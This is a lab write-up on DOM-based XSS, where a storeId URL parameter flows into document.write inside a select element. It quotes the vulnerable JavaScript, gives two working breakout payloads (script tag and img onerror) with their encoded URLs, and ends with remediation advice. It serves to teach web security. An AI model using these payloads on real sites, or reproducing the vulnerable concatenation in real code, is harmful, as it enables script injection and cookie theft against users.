# DOM XSS in document.write Sink Using Source location.search Inside a Select Element        

## 1. Vulnerability Overview

**Vulnerability Type:** DOM-Based Cross-Site Scripting (DOM XSS)  
**Difficulty:** Practitioner  
**Source:** `window.location.search`  
**Sink:** `document.write()`  
**Affected Functionality:** Stock Checker

This lab contains a DOM-based XSS vulnerability in the stock checker functionality.

The application retrieves the `storeId` parameter from the URL query string and inserts its value directly into an HTML document using `document.write()`.

Because the input is not properly validated or encoded, an attacker can inject HTML markup, break out of the existing HTML structure, and execute JavaScript in the victim's browser.

## 2. Source & Sink Identification

### Source

```javascript
var store = (new URLSearchParams(window.location.search)).get('storeId');
```

The source is `window.location.search`, which retrieves the query string from the current URL.

For example:

```text
/product?productId=3&storeId=London
```

The application extracts the value of the `storeId` parameter using `.get('storeId')`.

In this example:

```javascript
store = "London";
```

Since the user can modify URL parameters, the `storeId` value is attacker-controlled.

### Sink

The application uses `document.write()` to insert the extracted value into the HTML document.

The vulnerable statement is:

```javascript
document.write('<option selected>'+store+'</option>');
```

`document.write()` writes HTML content into the document. The application directly concatenates the untrusted `store` value into an HTML string.

This allows an attacker to inject HTML markup instead of ordinary store names.

## 3. Vulnerable Code Analysis

The relevant application code:

```javascript
var stores = ["London","Paris","Milan"];

var store = (new URLSearchParams(window.location.search)).get('storeId');

document.write('<select name="storeId">');

if(store) {
    document.write('<option selected>'+store+'</option>');
}

for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }

    document.write('<option>'+stores[i]+'</option>');
}

document.write('</select>');
```

### Code Breakdown

**1. Available store names**

```javascript
var stores = ["London","Paris","Milan"];
```

The application defines three available store locations.

**2. Retrieving user input**

```javascript
var store = (new URLSearchParams(window.location.search)).get('storeId');
```

The application reads the `storeId` parameter from the URL.

**3. Creating the select element**

```javascript
document.write('<select name="storeId">');
```

Creates an HTML dropdown element.

**4. Inserting the selected store**

```javascript
document.write('<option selected>'+store+'</option>');
```

This is the vulnerable operation.

The application assumes that `store` contains an ordinary store name. However, an attacker can supply HTML markup instead.

**5. Closing the HTML structure**

```javascript
document.write('</select>');
```

Normally, this closes the dropdown element. However, attacker-controlled input can potentially close the existing elements earlier and inject additional markup.

## 4. Proof of Concept (PoC)

### Step 1: Identify the vulnerable code

I inspected the page using browser Developer Tools and located the JavaScript responsible for the stock checker functionality.

The source and sink were identified as:

- Source: `window.location.search`
- Sink: `document.write()`

### Step 2: Understand the HTML context

The application generates the following HTML structure:

```html
<select name="storeId">
    <option selected>London</option>
    <option>Paris</option>
    <option>Milan</option>
</select>
```

The attacker-controlled value is inserted inside the selected `option` element.

Therefore, the first step is to escape the existing HTML structure.

### Step 3: Break out of the HTML elements

I constructed the following payload:

```html
</option></select><script>alert(1)</script>
```

This payload performs three operations:

1. `</option>` closes the currently selected option.
2. `</select>` closes the dropdown element.
3. `<script>alert(1)</script>` injects a script element that executes JavaScript.

I tested it using the following URL:

```text
/product?productId=3&storeId=%3C/option%3E%3C/select%3E%3Cscript%3Ealert(1)%3C/script%3E
```

The browser executed `alert(1)`, confirming successful JavaScript execution.

### Step 4: Test an alternative HTML injection technique

I also tested an image-based payload:

```html
</option></select><img src=x onerror=alert(1)>
```

The corresponding URL:

```text
/product?productId=3&storeId=%3C/option%3E%3C/select%3E%3Cimg%20src=x%20onerror=alert(1)%3E
```

The invalid image source triggered the `onerror` event handler, which executed `alert(1)`.

**Result:** Both payloads successfully executed JavaScript, confirming the DOM XSS vulnerability.

## 5. Payload Breakdown

### Payload 1: Script injection

```html
</option></select><script>alert(1)</script>
```

| Component | Purpose |
|---|---|
| `</option>` | Closes the existing option element |
| `</select>` | Closes the existing select element |
| `<script>` | Creates a script element |
| `alert(1)` | Executes JavaScript |
| `</script>` | Closes the script element |

### Payload 2: Image event-handler injection

```html
</option></select><img src=x onerror=alert(1)>
```

| Component | Purpose |
|---|---|
| `</option>` | Closes the existing option |
| `</select>` | Closes the existing dropdown |
| `<img>` | Creates an image element |
| `src=x` | Provides an invalid image source |
| `onerror` | Executes when image loading fails |
| `alert(1)` | Confirms JavaScript execution |

Both payloads exploit the same underlying issue: untrusted input is interpreted as HTML rather than treated as plain text.

## 6. Important Observation: The Role of `&` in the URL

One important detail during testing was the use of `&` between URL parameters.

For example:

```text
/product?productId=3&storeId=PAYLOAD
```

Here:

- `?` starts the query string.
- `productId=3` is the first parameter.
- `&` separates one query parameter from another.
- `storeId=PAYLOAD` is the second parameter.

The `&` is essential because it tells the browser and `URLSearchParams` that `storeId` is a separate parameter.

Without the correct parameter separator, the application might not extract the intended `storeId` value.

### URL Encoding

The payload contains special characters such as `<`, `>`, and spaces.

These characters may be URL-encoded when placed inside the query string.

Examples:

| Character | Encoded form |
|---|---|
| `<` | `%3C` |
| `>` | `%3E` |
| Space | `%20` |

The browser's URL parameter handling decodes these values when `URLSearchParams.get('storeId')` retrieves them.

## 7. Attack Flow

1. Attacker identifies the `storeId` parameter as an attacker-controlled source.
2. The application retrieves the value using `URLSearchParams`.
3. The value is concatenated into an HTML string.
4. `document.write()` writes the resulting HTML into the document.
5. The attacker injects closing tags to escape the existing `option` and `select` elements.
6. Additional HTML markup is injected outside the original dropdown.
7. The browser executes the injected JavaScript.

## 8. Potential Impact

Depending on the application's context, DOM-based XSS may allow an attacker to:

- Execute arbitrary JavaScript in the vulnerable application's origin.
- Modify page content and user interactions.
- Perform actions through the victim's authenticated session, subject to application security controls.
- Access data available to JavaScript, including cookies that are not protected by `HttpOnly`.
- Conduct phishing and other client-side attacks.

The actual impact depends on the application's functionality and security controls.

## 9. Remediation

**1. Avoid using `document.write()` with untrusted input.**

`document.write()` can interpret attacker-controlled strings as HTML. Avoid using it to insert URL parameter values.

**2. Use `textContent` for plain text.**

Instead of constructing HTML strings, create the required elements and assign untrusted values using safe DOM APIs such as `textContent`.

**3. Validate input against expected store names.**

If the application only accepts London, Paris, and Milan, verify that the supplied value matches one of these allowed values.

**4. Use safe DOM manipulation.**

Build elements using DOM APIs such as `document.createElement()` and insert them safely rather than concatenating untrusted input into HTML.

**5. Implement Content Security Policy (CSP).**

A properly configured CSP can reduce the impact of certain XSS attacks, but it should not replace secure handling of untrusted input.

## 10. Key Learning Points

- `window.location.search` is a potential attacker-controlled source.
- `URLSearchParams.get()` retrieves individual query parameter values.
- `document.write()` can become a dangerous sink when untrusted data is inserted into HTML.
- HTML structure breakout allows an attacker to escape an existing element and inject new markup.
- Both script-element injection and event-handler injection can demonstrate JavaScript execution in this lab.
- `&` separates query parameters, allowing the application to correctly retrieve `storeId`.
- URL encoding changes how special characters are represented in a URL; it does not make the decoded input safe.

**Main Takeaway:** Always consider the HTML context in which user-controlled data is inserted. When untrusted input reaches `document.write()` without proper handling, an attacker may be able to break out of the intended HTML structure and execute JavaScript.
